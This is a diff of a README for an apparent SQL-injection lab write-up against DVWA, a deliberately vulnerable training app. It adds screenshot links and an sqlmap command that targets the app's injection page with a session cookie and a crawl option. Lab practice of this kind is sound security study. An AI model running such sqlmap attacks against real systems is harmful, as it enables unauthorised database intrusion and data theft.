@@ -70,12 +70,17 @@ sqlmap -u 'http://dvwa.structureality.com/vulnerabilities/sqli/?id=1&Submit=Subm
 
 ![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/f1d7b932-0c0f-46a4-bee2-ba09b0d00bb8)
 
-![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/d01914a3-bedc-4575-a7a8-0a9ae956ddd9)
+![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/1f3eb4f5-0ccc-4bbf-88d2-2eb6f7768f72)
 
+![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/76693b60-f298-4a2d-ac92-b6002325bcd5)
 
+![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/d6adb983-0a42-447c-8abc-384a88ae8070)
 
+sqlmap -u 'http://dvwa.structureality.com/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie="PHPSESSID=7sn493728m0g341pk94b5aq9bg; security=low" -crawl=3
 
+![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/33a8e2a0-63b5-4eb6-bf9c-757226a01fd7)
 
+![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/61f89795-22df-4ca6-afb0-0d57bd62d122)
 
 
 
